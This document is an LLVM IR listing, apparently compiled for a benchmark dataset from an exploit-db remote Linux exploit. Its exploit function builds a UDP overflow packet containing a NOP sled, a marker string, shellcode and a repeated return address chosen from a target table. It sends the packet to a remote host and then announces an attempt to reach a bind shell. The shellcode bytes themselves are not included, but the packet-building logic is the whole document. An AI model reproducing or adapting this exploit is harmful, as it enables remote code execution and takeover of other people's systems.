; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_826.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_826.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }
%struct.sockaddr_in = type { i32, i32, i32 }
%struct.hostent = type { i32, i64 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i8] c"can't open datagram\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@inforeq = common dso_local global i8* null, align 8
@findme = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"sendto\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"[-] Trying to reach bindshell...\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @exploit(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [1046 x i8], align 16
  %10 = alloca [4 x i8], align 1
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  %13 = load i32, i32* @AF_INET, align 4
  %14 = load i32, i32* @SOCK_DGRAM, align 4
  %15 = call i32 @socket(i32 %13, i32 %14, i32 0)
  store i32 %15, i32* %8, align 4
  %16 = icmp slt i32 %15, 0
  br i1 %16, label %17, label %20

17:                                               ; preds = %3
  %18 = call i32 @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %19 = call i32 @exit(i32 1) #3
  unreachable

20:                                               ; preds = %3
  %21 = load i8*, i8** %5, align 8
  %22 = call %struct.hostent* @gethostbyname(i8* %21)
  store %struct.hostent* %22, %struct.hostent** %12, align 8
  %23 = bitcast %struct.sockaddr_in* %11 to i8*
  %24 = call i32 @bzero(i8* %23, i32 12)
  %25 = load i32, i32* @AF_INET, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %25, i32* %26, align 4
  %27 = load %struct.hostent*, %struct.hostent** %12, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 1
  %29 = load i64, i64* %28, align 8
  %30 = inttoptr i64 %29 to i8*
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %32 = bitcast i32* %31 to i8*
  %33 = load %struct.hostent*, %struct.hostent** %12, align 8
  %34 = getelementptr inbounds %struct.hostent, %struct.hostent* %33, i32 0, i32 0
  %35 = load i32, i32* %34, align 8
  %36 = call i32 @bcopy(i8* %30, i8* %32, i32 %35)
  %37 = load i32, i32* %6, align 4
  %38 = call i32 @htons(i32 %37)
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i32 %38, i32* %39, align 4
  %40 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %41 = load i32, i32* %7, align 4
  %42 = sub nsw i32 %41, 1
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %40, i64 %43
  %45 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, 255
  %48 = trunc i32 %47 to i8
  %49 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 0
  store i8 %48, i8* %49, align 1
  %50 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sub nsw i32 %51, 1
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i64 %53
  %55 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = and i32 %56, 65280
  %58 = ashr i32 %57, 8
  %59 = trunc i32 %58 to i8
  %60 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 1
  store i8 %59, i8* %60, align 1
  %61 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %62 = load i32, i32* %7, align 4
  %63 = sub nsw i32 %62, 1
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %61, i64 %64
  %66 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %65, i32 0, i32 0
  %67 = load i32, i32* %66, align 4
  %68 = and i32 %67, 16711680
  %69 = ashr i32 %68, 16
  %70 = trunc i32 %69 to i8
  %71 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 2
  store i8 %70, i8* %71, align 1
  %72 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %73 = load i32, i32* %7, align 4
  %74 = sub nsw i32 %73, 1
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %72, i64 %75
  %77 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 4
  %79 = and i32 %78, -16777216
  %80 = lshr i32 %79, 24
  %81 = trunc i32 %80 to i8
  %82 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 3
  store i8 %81, i8* %82, align 1
  %83 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %84 = call i32 @memset(i8* %83, i32 0, i32 1046)
  %85 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %86 = load i8*, i8** @inforeq, align 8
  %87 = call i32 @memcpy(i8* %85, i8* %86, i32 13)
  %88 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %89 = getelementptr inbounds i8, i8* %88, i64 13
  %90 = call i32 @memset(i8* %89, i32 144, i32 138)
  %91 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %92 = getelementptr inbounds i8, i8* %91, i64 151
  %93 = load i8*, i8** @findme, align 8
  %94 = load i8*, i8** @findme, align 8
  %95 = call i32 @strlen(i8* %94)
  %96 = call i32 @memcpy(i8* %92, i8* %93, i32 %95)
  %97 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %98 = getelementptr inbounds i8, i8* %97, i64 170
  %99 = load i8*, i8** @shellcode, align 8
  %100 = load i8*, i8** @shellcode, align 8
  %101 = call i32 @strlen(i8* %100)
  %102 = call i32 @memcpy(i8* %98, i8* %99, i32 %101)
  %103 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %104 = getelementptr inbounds i8, i8* %103, i64 995
  %105 = call i32 @memset(i8* %104, i32 144, i32 42)
  %106 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %107 = getelementptr inbounds i8, i8* %106, i64 1037
  %108 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 0
  %109 = call i32 @memcpy(i8* %107, i8* %108, i32 4)
  %110 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %111 = getelementptr inbounds i8, i8* %110, i64 1041
  %112 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 0
  %113 = call i32 @memcpy(i8* %111, i8* %112, i32 4)
  %114 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 1046
  store i8 10, i8* %114, align 2
  %115 = load i32, i32* %8, align 4
  %116 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %117 = getelementptr inbounds [1046 x i8], [1046 x i8]* %9, i64 0, i64 0
  %118 = call i32 @strlen(i8* %117)
  %119 = sext i32 %118 to i64
  %120 = mul i64 %119, 1
  %121 = trunc i64 %120 to i32
  %122 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %123 = call i64 @sendto(i32 %115, i8* %116, i32 %121, i32 0, %struct.sockaddr* %122, i32 12)
  %124 = icmp slt i64 %123, 0
  br i1 %124, label %125, label %128

125:                                              ; preds = %20
  %126 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %127 = call i32 @exit(i32 1) #3
  unreachable

128:                                              ; preds = %20
  %129 = call i32 @usleep(i32 7000)
  %130 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %131 = load i32, i32* %4, align 4
  ret i32 %131
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @bcopy(i8*, i8*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
